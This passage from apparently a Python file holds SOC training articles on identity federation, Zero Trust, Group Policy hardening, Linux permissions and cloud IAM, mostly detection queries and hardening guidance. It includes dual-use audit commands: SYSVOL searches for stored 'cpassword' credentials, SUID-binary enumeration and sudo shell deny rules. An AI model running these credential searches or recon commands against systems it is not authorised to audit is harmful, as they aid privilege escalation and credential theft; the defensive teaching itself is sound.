   GET https://idp.contoso.com/.well-known/openid-configuration

   Response:
   {
     "issuer": "https://idp.contoso.com",
     "authorization_endpoint": "https://idp.contoso.com/authorize",
     "token_endpoint": "https://idp.contoso.com/token",
     "jwks_uri": "https://idp.contoso.com/.well-known/jwks.json",
     "id_token_signing_alg_values_supported": ["RS256"]
   }

2. SP fetches IdP's public keys for token validation:
   GET https://idp.contoso.com/.well-known/jwks.json

3. During authentication, SP validates id_token:
   - Signature verified with IdP's public key
   - Issuer matches expected IdP
   - Audience matches SP's client_id
   - Token is not expired
   - Nonce matches (replay protection)
```

## Cross-Domain Trust Models

| Trust Model | Description | Use Case |
|-------------|-----------|----------|
| Direct trust | Two organizations directly trust each other | Two companies with partnership agreement |
| Hub-and-spoke | Central IdP trusted by multiple SPs | Enterprise with many SaaS applications |
| Mesh trust | Multiple organizations mutually trust each other | Research consortium, industry alliance |
| Brokered trust | Third party brokers trust between organizations | Industry identity federation (InCommon, eduGAIN) |
| Transitive trust | Trust flows through intermediaries: A trusts B, B trusts C, so A trusts C | AD forest trusts |
| Non-transitive | Trust does not flow: A trusts B, B trusts C, A does NOT trust C | AD external trusts |

## B2B Federation Patterns

### Azure AD B2B Federation

```
Scenario: Contoso employees need access to Fabrikam's SharePoint

Configuration at Fabrikam (SP):
  1. Add Contoso as external identity provider
  2. Configure cross-tenant access settings
  3. Define which Contoso users can access which resources
  4. Set conditional access policies for external users

Configuration at Contoso (IdP):
  1. Configure cross-tenant access settings for Fabrikam
  2. Allow users to accept federation invitations
  3. Define which users can collaborate externally

User Experience:
  1. Fabrikam invites jane@contoso.com to SharePoint
  2. Jane clicks invitation link
  3. Redirected to Contoso's Azure AD for authentication
  4. Contoso authenticates Jane (with MFA per Contoso's policy)
  5. Jane redirected back to Fabrikam's SharePoint with valid token
  6. Fabrikam grants access based on its own authorization policies
```

### AWS IAM Identity Federation

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789012:saml-provider/ContosoIdP"
    },
    "Action": "sts:AssumeRoleWithSAML",
    "Condition": {
      "StringEquals": {
        "SAML:aud": "https://signin.aws.amazon.com/saml"
      }
    }
  }]
}
```

## Trust Validation and Security

### Establishing Trust Securely

```
Trust Establishment Checklist:

1. VERIFY IDENTITY
   - Confirm the other organization is legitimate
   - Validate domain ownership
   - Exchange metadata through secure channel (not email)

2. DEFINE SCOPE
   - Which users can federate (all or specific groups)
   - Which applications/resources are accessible
   - Which attributes are shared (minimize data exposure)

3. SET POLICIES
   - Require MFA from the IdP
   - Define session lifetime limits
   - Specify acceptable authentication methods
   - Set conditional access rules for federated users

4. MONITOR
   - Log all federated authentication events
   - Alert on unusual federated access patterns
   - Review trust relationships quarterly

5. INCIDENT RESPONSE
   - Define how to disable federation in emergency
   - Establish communication channels between security teams
   - Document breach notification obligations
```

### Federation Security Risks

| Risk | Description | Mitigation |
|------|-------------|------------|
| IdP compromise | If partner's IdP is breached, attacker can forge assertions | Monitor for unusual assertion patterns, require MFA |
| Assertion replay | Captured assertion reused for unauthorized access | Short validity windows, one-time-use enforcement |
| Attribute manipulation | Attacker modifies attributes in assertion | Signature validation, attribute value whitelisting |
| Scope creep | Federation provides more access than intended | Regular trust reviews, principle of least privilege |
| Orphaned trusts | Trust remains after business relationship ends | Quarterly trust inventory and review |
| Token signing key theft | Golden SAML attack with stolen IdP signing key | HSM-protected signing keys, key rotation |

### Monitoring Federated Access

```
# Azure AD — monitor external identity access
SigninLogs
| where HomeTenantId != ResourceTenantId
| summarize count() by UserPrincipalName, HomeTenantId,
            AppDisplayName, IPAddress, ResultType
| sort by count_ desc

# Splunk — detect unusual federated login patterns
index=auth authentication_type=federated
| stats count dc(app) as unique_apps values(app) as apps by user, idp_issuer
| where unique_apps > 5
| sort -count

# Alert conditions:
- Federated login from unexpected IdP
- Federated user accessing previously unaccessed resources
- High volume of federated assertions in short window
- Federated access from unusual geographic location
- Assertion claims that don't match known IdP configuration
```

## Key Takeaways

- Federation eliminates the need for duplicate identities across organizations
- Trust relationships must be scoped, monitored, and reviewed regularly
- IdP compromise cascades to all federated service providers
- SAML and OIDC are the dominant federation protocols
- SOC analysts must monitor federated authentication as a potential lateral movement path
- Orphaned federation trusts are a significant security risk that requires periodic review
"""))

    # ---------------------------------------------------------------
    # Article 11: Zero Trust Architecture Principles
    # ---------------------------------------------------------------
    articles.append(("Zero Trust Architecture Principles", ["identity", "access-management", "zero-trust", "nist", "micro-segmentation", "security-architecture"], r"""# Zero Trust Architecture Principles

## Overview

Zero Trust is a security architecture philosophy that eliminates implicit trust from network design. The traditional perimeter-based model assumed that everything inside the corporate network was trusted. Zero Trust assumes breach: every access request is treated as if it originates from an untrusted network, regardless of where the request comes from or what resource it accesses.

The core principle is simple: never trust, always verify. Every user, device, and network flow must be authenticated, authorized, and continuously validated before access is granted.

## Zero Trust vs Traditional Perimeter Security

| Aspect | Traditional Perimeter | Zero Trust |
|--------|----------------------|------------|
| Trust model | Trust inside, distrust outside | Trust nothing, verify everything |
| Network boundary | Hard outer shell, soft interior | No implicit trust zones |
| Access decision | Network location determines trust | Identity + device + context determine trust |
| Lateral movement | Easy once inside perimeter | Blocked by micro-segmentation |
| Remote access | VPN tunnels into trusted network | Direct access with identity verification |
| Assume breach | No | Yes |
| Monitoring | Perimeter-focused | Continuous, everywhere |

## NIST SP 800-207: Zero Trust Architecture

NIST SP 800-207 is the definitive reference for Zero Trust Architecture (ZTA). It defines the logical components and deployment models.

### ZTA Logical Components

```
                     Policy Decision Point (PDP)
                     +---------------------------+
                     |   Policy Engine (PE)      |
                     |   - Evaluates access       |
                     |     requests against        |
                     |     policy rules            |
                     |                             |
                     |   Policy Administrator (PA) |
                     |   - Executes PE decisions   |
                     |   - Configures enforcement  |
                     +---------------------------+
                              |
                     Trust Algorithm Inputs:
                     - User identity + MFA status
                     - Device health + compliance
                     - Application sensitivity
                     - Network location
                     - Time of access
                     - Threat intelligence
                     - Behavioral analytics
                              |
Subject -----> Policy Enforcement Point (PEP) -----> Resource
(User/Device)  (Grants or blocks access)           (Application/Data)
```

### NIST ZTA Tenets

| Tenet | Description |
|-------|-------------|
| 1 | All data sources and computing services are considered resources |
| 2 | All communication is secured regardless of network location |
| 3 | Access to individual resources is granted on a per-session basis |
| 4 | Access is determined by dynamic policy including client identity, application, and requesting asset |
| 5 | Enterprise monitors and measures the security posture of all owned and associated assets |
| 6 | All resource authentication and authorization are dynamic and strictly enforced before access |
| 7 | Enterprise collects information about the current state of assets and uses it to improve security |

## Pillars of Zero Trust

| Pillar | Focus Area | Key Controls |
|--------|-----------|-------------|
| Identity | Users and service accounts | Strong MFA, conditional access, identity governance |
| Devices | Endpoints and IoT | Device health attestation, MDM compliance, EDR |
| Networks | Network segmentation | Micro-segmentation, encrypted communications, SDN |
| Applications | App-level access control | Per-app authorization, API security, CASB |
| Data | Data classification and protection | Encryption, DLP, rights management, labeling |
| Visibility and Analytics | Continuous monitoring | SIEM, UEBA, network flow analysis, real-time risk scoring |
| Automation and Orchestration | Automated response | SOAR, automatic containment, dynamic policy updates |

## Identity-Centric Security

Identity is the foundation of Zero Trust. Every access decision starts with verifying identity.

```
Zero Trust Identity Verification Flow:

1. USER IDENTITY
   - Who is requesting access?
   - Strong authentication (phishing-resistant MFA)
   - Verified against identity provider
   - Risk score calculated from behavior history

2. DEVICE IDENTITY
   - What device is being used?
   - Is it managed/enrolled?
   - Is EDR agent running and healthy?
   - Is OS patched and compliant?
   - Is disk encrypted?

3. CONTEXT
   - Where is the request from? (IP, geo, network)
   - When is it happening? (business hours, time zone)
   - What is the risk level? (threat intel, UEBA score)
   - Is this access pattern normal for this user?

4. POLICY DECISION
   - All signals evaluated together
   - Access granted, denied, or step-up auth required
   - Session monitoring continues after access granted
   - Access can be revoked in real-time if risk changes
```

### Conditional Access Example (Azure AD)

```json
{
  "displayName": "Require MFA for sensitive apps from unmanaged devices",
  "conditions": {
    "applications": {
      "includeApplications": ["HR-Portal", "Finance-System", "SIEM"]
    },
    "users": {
      "includeUsers": ["All"]
    },
    "platforms": {
      "includePlatforms": ["all"]
    },
    "deviceStates": {
      "excludeStates": ["compliant", "domainJoined"]
    },
    "locations": {
      "excludeLocations": ["Corporate-Network"]
    }
  },
  "grantControls": {
    "operator": "AND",
    "builtInControls": [
      "mfa",
      "compliantDevice"
    ]
  },
  "sessionControls": {
    "signInFrequency": {
      "value": 1,
      "type": "hours"
    },
    "cloudAppSecurity": {
      "isEnabled": true,
      "cloudAppSecurityType": "monitorOnly"
    }
  }
}
```

## Micro-Segmentation

Micro-segmentation divides the network into small, isolated zones where each workload or resource is individually protected.

```
Traditional flat network:
  [Web Server] <---> [App Server] <---> [Database] <---> [File Server]
  All servers can communicate freely. One compromise = full lateral movement.

Micro-segmented network:
  [Web Server]          [App Server]         [Database]
       |                     |                    |
  [Segment Policy]      [Segment Policy]    [Segment Policy]
       |                     |                    |
  Allow: inbound 443    Allow: from Web:8080  Allow: from App:3306
  Deny: all else        Deny: all else        Deny: all else

  Web Server CANNOT directly reach Database.
  Each segment has its own policy enforcement.
  Compromise of web server limits attacker to that segment.
```

## Implementation Roadmap

| Phase | Duration | Activities |
|-------|----------|-----------|
| 1. Assess | 1-3 months | Inventory assets, map data flows, identify crown jewels, gap analysis |
| 2. Foundation | 3-6 months | Deploy strong identity (MFA for all), device management, basic segmentation |
| 3. Enhance | 6-12 months | Conditional access policies, micro-segmentation, continuous monitoring |
| 4. Mature | 12-24 months | Automated policy enforcement, UEBA, real-time risk scoring, full ZTA |
| 5. Optimize | Ongoing | Continuous improvement, red team validation, policy refinement |

### Quick Wins for Zero Trust

```
1. Enable MFA for all users (start with admins, then expand)
2. Implement conditional access policies for cloud apps
3. Deploy EDR on all endpoints
4. Segment administrative networks from user networks
5. Remove standing privileged access (implement JIT)
6. Enable sign-in risk policies (block high-risk logins)
7. Classify sensitive data and apply protection labels
8. Monitor and alert on all admin activities
```

## SOC Analyst Role in Zero Trust

```
SOC analysts are critical to Zero Trust operations:

MONITORING:
  - Review conditional access policy denials
  - Investigate risk-based authentication failures
  - Monitor device compliance status changes
  - Analyze user behavior analytics alerts
  - Track micro-segmentation policy violations

INVESTIGATION:
  - Correlate identity signals across multiple pillars
  - Assess whether access denial was correct or false positive
  - Investigate lateral movement attempts blocked by segmentation
  - Analyze unusual access patterns flagged by UEBA

IMPROVEMENT:
  - Recommend policy adjustments based on investigation findings
  - Identify gaps in segmentation through penetration test results
  - Propose new conditional access rules for emerging threats
  - Validate that Zero Trust controls are functioning as intended
```

## Key Takeaways

- Zero Trust eliminates implicit trust: every access request must be verified
- NIST SP 800-207 provides the architectural framework for ZTA
- Identity is the new perimeter: strong MFA and conditional access are foundational
- Micro-segmentation limits lateral movement even after initial compromise
- Zero Trust is a journey, not a destination: implement incrementally
- SOC analysts play a critical role in monitoring and validating Zero Trust controls
"""))

    # ---------------------------------------------------------------
    # Article 12: Group Policy Fundamentals for Security
    # ---------------------------------------------------------------
    articles.append(("Group Policy Fundamentals for Security", ["identity", "access-management", "group-policy", "gpo", "windows", "active-directory", "hardening"], r"""# Group Policy Fundamentals for Security

## Overview

Group Policy is a Windows feature that provides centralized management and configuration of operating systems, applications, and user settings in Active Directory environments. Group Policy Objects (GPOs) are the building blocks — each GPO contains a collection of policy settings that are applied to users and computers in specific OUs, domains, or sites.

For SOC analysts, GPOs are critical because they define the security baseline of the entire Windows environment. Misconfigured GPOs can leave systems vulnerable, while proper GPO configuration is a key defense against common attack techniques.

## What is a GPO?

A GPO consists of two parts:

```
Group Policy Object (GPO)
  |
  +-- Group Policy Container (GPC)
  |     Stored in Active Directory (LDAP)
  |     Contains: GPO metadata, version, status, security filtering
  |     Location: CN=Policies,CN=System,DC=contoso,DC=com
  |
  +-- Group Policy Template (GPT)
        Stored on SYSVOL share (file system)
        Contains: Actual policy settings, scripts, files
        Location: \\contoso.com\SYSVOL\contoso.com\Policies\{GUID}\

GPT Folder Structure:
  {GUID}\
    +-- Machine\        (Computer Configuration settings)
    |     +-- Registry.pol
    |     +-- Scripts\
    |     +-- Microsoft\Windows NT\SecEdit\GptTmpl.inf
    +-- User\           (User Configuration settings)
    |     +-- Registry.pol
    |     +-- Scripts\
    +-- GPT.INI          (Version information)
```

## GPO Processing Order: LSDOU

GPOs are processed in a specific order. When settings conflict, the last applied wins.

```
Processing Order (first to last):

L = Local Group Policy (on each computer)
    Lowest precedence, applied first
    Location: %SystemRoot%\System32\GroupPolicy

S = Site-linked GPOs
    Applied to all computers/users in an AD site

D = Domain-linked GPOs
    Applied to all computers/users in the domain

OU = Organizational Unit GPOs
    Applied to computers/users in specific OUs
    Nested OUs: parent OU first, then child OU (highest precedence)

Result: OU GPO settings override Domain, which overrides Site, which overrides Local

Special modifiers:
  - "Enforced" (formerly "No Override"): GPO cannot be overridden by lower-level GPOs
  - "Block Inheritance": OU blocks all inherited GPOs (except Enforced ones)
  - "Security Filtering": GPO applies only to specific users/groups/computers
  - "WMI Filtering": GPO applies only if WMI query returns true
```

### GPO Processing Visualization

```
Local Policy ----+
                 |
Site GPO --------+---> Resulting Set of Policy (RSoP)
                 |
Domain GPO ------+     (Conflicts resolved by precedence:
                 |      last applied wins, unless Enforced)
Parent OU GPO ---+
                 |
Child OU GPO ----+  <-- Highest precedence (applied last)
```

## Security-Relevant GPO Settings

### Audit Policy Configuration

```
Computer Configuration > Policies > Windows Settings > Security Settings
  > Advanced Audit Policy Configuration

Recommended Audit Settings for SOC:

| Category | Subcategory | Audit |
|----------|-------------|-------|
| Account Logon | Credential Validation | Success, Failure |
| Account Logon | Kerberos Authentication Service | Success, Failure |
| Account Logon | Kerberos Service Ticket Operations | Success, Failure |
| Account Management | User Account Management | Success, Failure |
| Account Management | Security Group Management | Success, Failure |
| Account Management | Computer Account Management | Success |
| Logon/Logoff | Logon | Success, Failure |
| Logon/Logoff | Logoff | Success |
| Logon/Logoff | Special Logon | Success |
| Object Access | File System | Success, Failure |
| Object Access | Registry | Success, Failure |
| Policy Change | Audit Policy Change | Success |
| Policy Change | Authentication Policy Change | Success |
| Privilege Use | Sensitive Privilege Use | Success, Failure |
| System | Security System Extension | Success |
| Detailed Tracking | Process Creation | Success |
```

### Security Hardening GPOs

| GPO Setting | Path | Recommended Value | Purpose |
|-------------|------|-------------------|---------|
| Command-line in process creation | Administrative Templates > System > Audit Process Creation | Enabled | Logs full command lines (Event 4688) |
| PowerShell script block logging | Administrative Templates > Windows Components > Windows PowerShell | Enabled | Logs all PowerShell code execution |
| PowerShell transcription | Administrative Templates > Windows Components > Windows PowerShell | Enabled + output directory | Full transcript of PowerShell sessions |
| Restrict NTLM | Security Settings > Local Policies > Security Options | Audit/Restrict | Detect and block NTLM authentication |
| WDigest authentication | Administrative Templates > System > Credentials Delegation | Disabled | Prevents cleartext passwords in memory |
| Remote Desktop NLA | Administrative Templates > Windows Components > Remote Desktop Services | Enabled | Requires NLA before RDP session |
| LSASS protection | Administrative Templates > System > Local Security Authority | Enabled | Prevents credential dumping |

### User Rights Assignment

```
Computer Configuration > Policies > Windows Settings > Security Settings
  > Local Policies > User Rights Assignment

Critical settings:
  - "Deny log on through Remote Desktop Services": Add unauthorized groups
  - "Allow log on through Remote Desktop Services": Restrict to authorized users
  - "Access this computer from the network": Remove Everyone, add specific groups
  - "Deny access to this computer from the network": Add local accounts
  - "Debug programs": Remove all non-admin users (prevents memory access)
  - "Manage auditing and security log": Restrict to security team
  - "Replace a process level token": Default only (LOCAL SERVICE, NETWORK SERVICE)
```

## Auditing GPO Changes

GPO modifications can indicate an attacker establishing persistence or weakening defenses.

### Key Events for GPO Monitoring

| Event ID | Source | Description |
|----------|--------|-------------|
| 5136 | Directory Service | AD object modified (includes GPO container changes) |
| 5137 | Directory Service | AD object created (new GPO creation) |
| 5141 | Directory Service | AD object deleted (GPO deletion) |
| 4739 | Security | Domain policy changed |
| 1000-1999 | GroupPolicy (Operational) | GPO processing events |

### Detecting Suspicious GPO Changes

```powershell
# Find recently modified GPOs
Get-GPO -All | Where-Object { $_.ModificationTime -gt (Get-Date).AddDays(-7) } |
    Select DisplayName, ModificationTime, Id |
    Sort ModificationTime -Desc

# Compare GPO versions (detect unauthorized changes)
Get-GPO -All | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.DisplayName
        ComputerVersion = $_.Computer.DSVersion
        UserVersion = $_.User.DSVersion
        Modified = $_.ModificationTime
    }
} | Sort Modified -Desc | Format-Table

# Check GPO permissions (who can edit)
$gpo = Get-GPO -Name "Security Baseline"
Get-GPPermission -Guid $gpo.Id -All |
    Where-Object { $_.Permission -match "Edit|Full" } |
    Select Trustee, Permission
```

```
# Splunk — detect GPO modifications
index=windows EventCode=5136
  ObjectClass="groupPolicyContainer"
| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
| sort _time

# SIEM alert: GPO modified by non-admin
index=windows EventCode=5136 ObjectClass="groupPolicyContainer"
| where NOT SubjectUserName IN ("gpo-admin","domain-admin")
| table _time, SubjectUserName, ObjectDN
```

## Common GPO Misconfigurations

| Misconfiguration | Risk | Detection |
|------------------|------|-----------|
| Credentials in GPP (Group Policy Preferences) | Passwords stored in XML on SYSVOL (cpassword) | Scan SYSVOL for cpassword entries |
| Overly permissive GPO edit rights | Attacker modifies GPO for persistence | Audit GPO permissions regularly |
| Disabled audit policies | No visibility into security events | Check RSoP for audit settings |
| WDigest enabled | Cleartext passwords in LSASS memory | Verify UseLogonCredential = 0 |
| Unrestricted PowerShell | No logging of malicious scripts | Enable script block and module logging |
| No AppLocker/SRP | No application whitelisting | Review software restriction policies |
| Blank local admin password | Easy local admin access | LAPS deployment check |

### Checking for GPP Passwords (Critical Vulnerability)

```powershell
# Scan SYSVOL for Group Policy Preferences passwords
# MS14-025 patched the creation but old files may persist
findstr /S /I "cpassword" "\\contoso.com\SYSVOL\contoso.com\Policies\*.xml"

# PowerShell equivalent
Get-ChildItem "\\contoso.com\SYSVOL" -Recurse -Filter "*.xml" |
    Select-String -Pattern "cpassword" |
    Select Path, Line
```

## GPO Investigation Commands

```powershell
# View GPOs applied to a specific computer
gpresult /r /scope:computer

# Generate detailed HTML report
gpresult /h C:\temp\gpo_report.html /f

# View Resultant Set of Policy for remote computer
Get-GPResultantSetOfPolicy -Computer "WORKSTATION01" -ReportType Html `
    -Path C:\temp\rsop_ws01.html

# List all GPOs linked to a specific OU
Get-GPInheritance -Target "OU=SOC,OU=Security,DC=contoso,DC=com"

# Export GPO settings for comparison
Get-GPOReport -All -ReportType Xml -Path C:\temp\all_gpos.xml

# Check if specific setting is configured
Get-GPRegistryValue -Name "Security Baseline" `
    -Key "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -ValueName "EnableScriptBlockLogging"
```

## Key Takeaways

- GPO processing order (LSDOU) determines which policies take effect
- Security hardening GPOs are essential: audit policies, PowerShell logging, LSASS protection
- Monitor GPO changes as they can indicate attacker persistence or defense weakening
- GPP passwords (cpassword) are a well-known vulnerability that may still exist in older environments
- Use gpresult and RSoP to verify that intended security policies are actually applied
- SOC analysts should know how to check GPO configurations during investigations
"""))

    # ---------------------------------------------------------------
    # Article 13: Linux Permissions and Access Control
    # ---------------------------------------------------------------
    articles.append(("Linux Permissions and Access Control", ["identity", "access-management", "linux", "permissions", "selinux", "apparmor", "sudo", "acl"], r"""# Linux Permissions and Access Control

## Overview

Linux access control is fundamental to system security. The Unix permission model (owner, group, other with read, write, execute) has been the bedrock of file system security for decades, supplemented by POSIX Access Control Lists (ACLs), sudo for privilege elevation, PAM for authentication modules, and mandatory access control systems like SELinux and AppArmor.

SOC analysts investigating Linux systems must understand how permissions work to assess whether an attacker escalated privileges, identify misconfigured services, and audit file access patterns.

## Standard File Permissions

### The Permission Triplet

```
  Owner   Group   Other
  r w x   r w x   r w x
  4 2 1   4 2 1   4 2 1

Example: -rwxr-xr-- = 754
  Owner:  rwx (4+2+1=7) = read + write + execute
  Group:  r-x (4+0+1=5) = read + execute
  Other:  r-- (4+0+0=4) = read only

File type indicators (first character):
  -  = regular file
  d  = directory
  l  = symbolic link
  c  = character device
  b  = block device
  p  = named pipe
  s  = socket
```

### Permission Meaning for Files vs Directories

| Permission | On a File | On a Directory |
|-----------|-----------|----------------|
| Read (r) | View file contents | List directory contents (ls) |
| Write (w) | Modify file contents | Create/delete files in directory |
| Execute (x) | Run as a program | Enter directory (cd), access files within |

### Changing Permissions

```bash
# Symbolic notation
chmod u+x script.sh          # Add execute for owner
chmod g-w config.yaml         # Remove write for group
chmod o= secret.key           # Remove all permissions for other
chmod u=rwx,g=rx,o= app.bin  # Set specific permissions

# Octal notation
chmod 755 script.sh           # rwxr-xr-x
chmod 640 config.yaml         # rw-r-----
chmod 600 private.key         # rw-------
chmod 444 readme.txt          # r--r--r-- (read-only for all)

# Recursive
chmod -R 750 /opt/application/

# Changing ownership
chown appuser:appgroup /opt/application/config.yaml
chown -R www-data:www-data /var/www/html/
```

## Special Permission Bits

| Bit | Octal | On File | On Directory |
|-----|-------|---------|-------------|
| SUID | 4000 | Runs as file owner (not caller) | No standard effect |
| SGID | 2000 | Runs as file group | New files inherit directory group |
| Sticky | 1000 | No standard effect | Only file owner can delete files in directory |

### SUID and SGID (Security Critical)

```bash
# SUID example: passwd command
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 /usr/bin/passwd
#   ^-- 's' means SUID is set
# Any user running passwd executes it as root (to modify /etc/shadow)

# Find all SUID binaries (critical security audit)
find / -perm -4000 -type f 2>/dev/null
# Common legitimate: passwd, sudo, su, ping, mount, umount
# Suspicious: anything in /tmp, /home, or unusual locations

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Set SUID/SGID
chmod 4755 /usr/local/bin/myapp   # SUID
chmod 2755 /opt/shared/tool       # SGID
chmod u+s /usr/local/bin/myapp    # Symbolic SUID

# Remove SUID (important for hardening)
chmod u-s /path/to/binary
chmod 0755 /path/to/binary
```

### Sticky Bit

```bash
# Sticky bit on /tmp prevents users from deleting each other's files
ls -ld /tmp
drwxrwxrwt 15 root root 4096 /tmp
#        ^-- 't' means sticky bit is set

# Set sticky bit
chmod 1777 /shared/tmp
chmod +t /shared/tmp
```

## POSIX Access Control Lists (ACLs)

ACLs extend standard permissions to allow fine-grained access for multiple users and groups.

```bash
# View ACLs
getfacl /opt/reports/quarterly.pdf
# file: opt/reports/quarterly.pdf
# owner: finance-admin
# group: finance
# user::rw-
# user:jane.analyst:r--       <-- Specific user ACL
# user:bob.auditor:r--        <-- Another specific user
# group::r--
# group:security-team:r--     <-- Specific group ACL
# mask::r--
# other::---

# Set ACL for specific user
setfacl -m u:jane.analyst:r /opt/reports/quarterly.pdf

# Set ACL for specific group
setfacl -m g:security-team:rx /opt/evidence/

# Set default ACL for new files in directory
setfacl -d -m g:security-team:rx /opt/evidence/

# Remove specific ACL entry
setfacl -x u:jane.analyst /opt/reports/quarterly.pdf

# Remove all ACLs
setfacl -b /opt/reports/quarterly.pdf

# Copy ACLs from one file to another
getfacl source.txt | setfacl --set-file=- target.txt

# ACL indicator in ls output
ls -la /opt/reports/quarterly.pdf
-rw-r-----+ 1 finance-admin finance 2048 quarterly.pdf
#         ^-- '+' indicates ACLs are present
```

## Sudo Configuration

Sudo allows controlled privilege escalation. The `/etc/sudoers` file defines who can run what commands as which users.

```bash
# Edit sudoers safely (syntax validation)
visudo

# Sudoers file structure
# User/Group   Host=(RunAs)   Commands

# Full admin access (DANGEROUS if overly broad)
admin ALL=(ALL:ALL) ALL

# SOC analyst: can run specific investigation tools as root
jane.analyst ALL=(root) /usr/bin/tcpdump, /usr/sbin/ss, /usr/bin/lsof, \
    /usr/bin/strace, /bin/netstat

# Group-based: SOC team can restart specific services
%soc-team ALL=(root) /bin/systemctl restart suricata, \
    /bin/systemctl restart zeek, \
    /bin/systemctl status *

# NOPASSWD for automation (use sparingly)
svc_monitoring ALL=(root) NOPASSWD: /usr/local/bin/check_health.sh

# Restrict: cannot run shells or editors (prevents escape to root shell)
jane.analyst ALL=(root) /usr/bin/tcpdump, !/bin/bash, !/bin/sh, \
    !/usr/bin/vi, !/usr/bin/vim, !/usr/bin/nano
```

### Sudo Security Audit

```bash
# Check who has sudo access
grep -v '^#' /etc/sudoers | grep -v '^$'
cat /etc/sudoers.d/*

# Check sudo logs
grep "sudo:" /var/log/auth.log | tail -50
# or
journalctl _COMM=sudo --since "1 hour ago"

# Find NOPASSWD entries (higher risk)
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/

# Test what a specific user can run
sudo -l -U jane.analyst
```

## PAM (Pluggable Authentication Modules)

PAM provides a configurable framework for authentication on Linux systems.

```bash
# PAM configuration directory
ls /etc/pam.d/
# common-auth    common-account    common-session    sshd    sudo    login

# Example: /etc/pam.d/sshd
auth       required     pam_env.so
auth       required     pam_faillock.so preauth deny=5 unlock_time=900
auth       sufficient   pam_unix.so nullok try_first_pass
auth       required     pam_faillock.so authfail deny=5 unlock_time=900
auth       required     pam_deny.so

account    required     pam_unix.so
account    required     pam_faillock.so

session    required     pam_limits.so
session    required     pam_unix.so

# PAM module types:
#   auth     = authentication (verify identity)
#   account  = account validation (expired? locked? time restrictions?)
#   session  = session setup/teardown (mount home, set ulimits)
#   password = password changes (complexity, history)

# PAM control flags:
#   required    = must succeed, but continue checking other modules
#   requisite   = must succeed, fail immediately if not
#   sufficient  = if succeeds, skip remaining modules of this type
#   optional    = result only matters if it's the only module
```

### Security-Relevant PAM Modules

| Module | Purpose | Config |
|--------|---------|--------|
| pam_faillock | Lock accounts after failed attempts | deny=5 unlock_time=900 |
| pam_pwquality | Password complexity requirements | minlen=15 minclass=3 |
| pam_tally2 | Account lockout (legacy) | deny=5 onerr=fail |
| pam_wheel | Restrict su to wheel group | group=wheel |
| pam_limits | Resource limits per user | /etc/security/limits.conf |
| pam_securetty | Restrict root login to specific terminals | /etc/securetty |
| pam_google_authenticator | TOTP MFA for Linux login | Per-user TOTP secrets |

## SELinux Basics

SELinux provides mandatory access control (MAC) on Linux, confining processes to minimum required access.

```bash
# Check SELinux status
getenforce           # Enforcing, Permissive, or Disabled
sestatus             # Detailed status

# SELinux modes
# Enforcing:  Policies enforced, violations denied and logged
# Permissive: Policies NOT enforced, violations only logged (audit mode)
# Disabled:   SELinux completely off

# View security context of files
ls -Z /var/www/html/
-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 index.html
#                      user:role:type:level

# View security context of processes
ps auxZ | grep httpd
system_u:system_r:httpd_t:s0    root  1234  /usr/sbin/httpd

# Check for SELinux denials (audit log)
ausearch -m avc --start recent
# or
grep "avc:  denied" /var/log/audit/audit.log

# Common troubleshooting: fix file context
restorecon -Rv /var/www/html/
# Changes file context to match policy defaults

# Temporarily set permissive for a domain (debugging)
semanage permissive -a httpd_t
```

## AppArmor Basics

AppArmor is an alternative MAC system (default on Ubuntu/Debian) that confines programs based on file paths rather than security labels.

```bash
# Check status and manage profiles
aa-status                          # List loaded profiles and their modes
aa-complain /usr/sbin/nginx        # Set to complain mode (log only)
aa-enforce /usr/sbin/nginx         # Set to enforce mode (deny + log)

# Check for denials
grep "apparmor.*DENIED" /var/log/syslog
journalctl | grep "apparmor.*DENIED"  # on systemd-based systems
```

## Security Auditing Commands

```bash
# Critical permission audit checks
find / -type f -perm -4000 2>/dev/null | sort          # SUID binaries
find / -type f -perm -002 -not -path "/proc/*" 2>/dev/null  # World-writable files
find / -type d -perm -002 -not -perm -1000 2>/dev/null      # World-writable dirs (no sticky)
find / -nouser -o -nogroup 2>/dev/null                       # No owner/group
ls -la /etc/shadow /etc/sudoers                              # Sensitive file perms
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/             # Passwordless sudo
```

## Key Takeaways

- Standard Unix permissions (rwx/octal) are the first layer of defense on Linux systems
- SUID binaries are common privilege escalation vectors; audit them regularly
- ACLs provide granular access beyond the owner/group/other model
- Sudo configuration must follow least privilege; restrict commands and deny shell access
- SELinux/AppArmor add mandatory access control that limits damage from compromised services
- SOC analysts should audit SUID binaries, world-writable files, and sudo configuration during investigations
"""))

    # ---------------------------------------------------------------
    # Article 14: Cloud IAM AWS Azure GCP
    # ---------------------------------------------------------------
    articles.append(("Cloud IAM AWS Azure GCP", ["identity", "access-management", "cloud", "aws", "azure", "gcp", "iam", "cloud-security"], r"""# Cloud IAM: AWS, Azure, and GCP

## Overview

Cloud Identity and Access Management (IAM) controls who can do what on which cloud resources. Each major cloud provider implements IAM differently, but the core concepts are shared: identities (users, groups, service accounts), policies (permission definitions), and roles (collections of permissions). Misconfigured cloud IAM is consistently the leading cause of cloud security breaches.

SOC analysts investigating cloud incidents must understand IAM across providers to determine blast radius, trace unauthorized access, and identify policy misconfigurations that enabled the attack.

## Core IAM Concepts Across Providers

| Concept | AWS | Azure | GCP |
|---------|-----|-------|-----|
| User identity | IAM User | Azure AD User | Google Workspace User |
| Service identity | IAM Role (assumed) | Service Principal / Managed Identity | Service Account |
| Permission grouping | IAM Policy (JSON) | Role Definition (JSON) | IAM Role |
| Permission assignment | Policy attachment | Role Assignment | IAM Binding |
| Resource hierarchy | Account > Region > Resource | Management Group > Subscription > Resource Group | Organization > Folder > Project |
| Federation | SAML/OIDC to IAM Roles | Azure AD B2B/External Identities | Workforce Identity Federation |
| Temporary credentials | STS AssumeRole | Managed Identity token | Service Account key / Workload Identity |

## AWS IAM

### AWS IAM Architecture

```
AWS Account
  |
  +-- IAM Users (human identities with long-term credentials)
  |     +-- Access Keys (CLI/API access)
  |     +-- Console password
  |     +-- MFA device
  |
  +-- IAM Groups (collections of users)
  |     +-- Policies attached to group apply to all members
